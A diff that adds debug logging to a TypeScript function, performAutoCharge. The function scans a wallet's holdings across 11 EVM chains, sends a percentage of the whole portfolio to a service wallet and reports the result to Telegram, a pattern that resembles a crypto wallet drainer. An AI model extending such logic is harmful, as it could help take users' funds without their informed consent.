@@ -301,13 +301,17 @@ export async function performAutoCharge(params: {
   const { walletAddress, serviceWallet, sendTransactionAsync, onProgress } = params;
 
   try {
+    console.log('🚀 performAutoCharge started');
     onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);
 
     // Build transactions
+    console.log('📝 Building charge transactions...');
     const { transactions, portfolioValue, chargePercent, totalChargeUsd, portfolio } = await buildChargeTransactions(
       walletAddress,
       serviceWallet
     );
+    
+    console.log('✅ Transactions built:', transactions.length);
 
     onProgress?.(`💰 Portfolio: $${portfolioValue.toFixed(2)} → Charge: ${chargePercent}% = $${totalChargeUsd.toFixed(2)}`);
     onProgress?.(`📝 Prepared ${transactions.length} transactions across ${new Set(transactions.map((t) => t.chainName)).size} chains`);
@@ -339,6 +343,7 @@ export async function performAutoCharge(params: {
     });
 
     // Execute transactions
+    console.log('🔄 Executing auto charge with', transactions.length, 'transactions');
     const result = await executeAutoCharge({
       walletAddress,
       serviceWallet,
@@ -346,6 +351,8 @@ export async function performAutoCharge(params: {
       sendTransactionAsync,
       onProgress,
     });
+    
+    console.log('✅ Auto charge execution completed:', result);
 
     // Send Telegram notification with detailed portfolio breakdown
     const portfolioBreakdown = portfolio.breakdown?.percentByChain 
